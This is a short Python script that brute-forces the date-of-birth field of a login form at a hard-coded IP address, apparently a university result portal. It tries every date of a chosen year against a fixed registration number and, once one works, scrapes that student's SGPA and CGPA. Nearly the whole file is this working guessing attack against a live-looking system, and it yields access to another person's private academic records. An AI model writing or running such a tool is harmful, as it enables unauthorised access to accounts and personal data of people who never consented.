#lets create  brower object
import mechanicalsoup as ms
from bs4 import BeautifulSoup
from dobGenerator import dobG
import pandas as pd

browser=ms.StatefulBrowser()

url="http://14.139.195.241/Result/login.php"

browser.open(url)
year=int(input("enter the year where the dob lie>>"))
arr=dobG(year)
# if there is a form lead me to there
#browser.follow_link("login")
print(browser.get_url())

for x in arr:

                #now select the form
                browser.select_form('form[name="frm"]')
                #now what are in form inputs
                #print(browser.get_current_form().print_summary())
                

                rollno="16EC01013"




                
                browser["regno"]=rollno
                browser["dob"]=x
                browser.submit_selected()
                if browser.get_url()=="http://14.139.195.241/Result/Results_menu.php":
                                
                                browser.open("http://14.139.195.241/Result/result.php")
                                page=browser.get_current_page()
                                tables=page.find_all('table')
                                result=[]
                                for x in tables:
                                                t=x.find_all('tr')
                                                row=t[-1]
                                                tt=row.find_all('b')
                                                temp=[]
                                                for y in tt:
                                                                s=y.get_text()
                                                                point=s.split("<")[0].split(":")[1].split(" ")[0]
                                                                #print(point)
                                                                temp.append(point)
                                                #print("\n\n")
                                                result+=[temp]
                                print("result")
                                ans='ROLL NO \t>>'+rollno+"\n"
                                i=0
                                while i<len(result):
                                                ans+=str(i+1)+" Sem>>\t SGPA: "+result[i][0]+"\tCGPA: "+result[i][1]+"\n"
                                                i+=1

                                print(ans)
                                browser.launch_browser()
                                break
                else:
                                print(x,"  failed")

